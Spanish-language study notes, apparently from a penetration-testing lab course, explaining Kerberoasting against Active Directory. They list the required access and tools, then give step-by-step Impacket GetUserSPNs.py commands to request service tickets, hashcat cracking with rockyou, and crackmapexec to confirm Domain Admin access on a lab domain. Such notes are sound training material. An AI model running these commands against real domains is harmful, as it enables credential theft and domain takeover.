## Descripcion general de Kerberoasting

Es una tecnica de movimiento lateral/escalada de privs en entornos AD

Se dirige a cuentas con SPN (identificadores unicos que Kerberos usa para asignar una instancia de servicio a una cuenta de servicio que estara ejecutando dicho servicio). Los servicios se asignan a usuarios para la autenticacion de red dentro del dominio

Cualquier usuario del dominio puede solicitar un ticket Kerberos para cualquier cuenta de servicio y tambien es posible a traves de confianzas entre bosques

Necesitamos alguna de estas cosas:

- Pass texto plano
- Hash NTLM
- Shell con contexto de una cuenta de usuario de dominio
- Acceso SYSTEM a un host unido al dominio

Las cuentas de dominio que ejecutan servicios suelen ser administradores locales

Las cuentas de servicio se configuran a menudo con contraseñas débiles o reutilizadas para simplificar la administración y a veces la contraseña es la misma que el nombre de usuario

Si se crackea la contraseña de una cuenta de servicio de SQL Server del dominio, es probable que te encuentres como administrador local en varios servidores, si no como Domain Admin

## Kerberoasting - Realizando el ataque

Puede realizarse desde:

- Desde un host Linux no unido al dominio utilizando credenciales de usuario de dominio válidas.
- Desde un host Linux unido al dominio como root después de recuperar el archivo keytab.
- Desde un host Windows unido al dominio autenticado como un usuario del dominio.
- Desde un host Windows unido al dominio con un shell en el contexto de una cuenta del dominio.
- Como SYSTEM en un host Windows unido al dominio.
- Desde un host Windows no unido al dominio usando [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

Se pueden utilizar varias herramientas para realizar el ataque:

- [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) de Impacket desde un host Linux no unido al dominio.
- Una combinación del binario integrado de Windows setspn.exe, PowerShell y Mimikatz.
- Desde Windows, utilizando herramientas como PowerView, [Rubeus](https://github.com/GhostPack/Rubeus) y otros scripts de PowerShell.

Obtener un tique TGS a través de Kerberoasting no te garantiza un conjunto de credenciales válidas, y el tique todavía debe ser `crackeado` sin conexión con una herramienta como Hashcat para obtener la contraseña en texto plano. Los tiques TGS tardan más en crackearse que otros formatos como los hashes NTLM, por lo que a menudo, a menos que se establezca una contraseña débil, puede ser difícil o imposible obtener el texto plano


## Kerberoasting con GetUserSPNs.py

![[Pasted image 20260928112416.png]]

[Instalar toolkit Impacket](https://github.com/SecureAuthCorp/impacket)

```
sudo python3 -m pip install .
```
![[Pasted image 20260928112453.png]]

Esto instalará todas las herramientas de Impacket y las colocará en nuestro PATH para que podamos llamarlas desde cualquier directorio en nuestro host de ataque

```
GetUserSPNs.py -h
```
![[Pasted image 20260928112520.png]]


1. Recopilamos un listado de SPNs del dominio (necesitamos creds validas de dominio y la IP del DC). Vale en texto plano, hash ntlm o ticket Kerberos

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
![[Pasted image 20260928112641.png]]

	Vemos que varias cuentas son miembros del grupo Domain Admins. Si podemos recuperar y crackear alguno de estos tickets podria llevarnos a la vuln del dominio


2. Extraemos todos los tickets TGS para su procesamiento sin conexion (`-request`). Los tickets se mostraran en un formato que se puede pasar directamente al hashcat

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
![[Pasted image 20260928112905.png]]

3. Podemos solicitar solo tickets TGS para una cuenta concreta por ejemplo para la cuenta `sqldev`

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
![[Pasted image 20260928113241.png]]

Con este tique en mano, podríamos intentar crackear la contraseña del usuario sin conexión

4. Crackeando el ticket sin conexion:

```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20260928113313.png]]


5. Hemos crackeado con éxito la contraseña del usuario como `database!`. Como último paso, podemos confirmar nuestro acceso y ver que efectivamente tenemos derechos de Domain Admin, ya que podemos autenticarnos en el DC objetivo en el dominio INLANEFREIGHT.LOCAL

```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
![[Pasted image 20260928113353.png]]
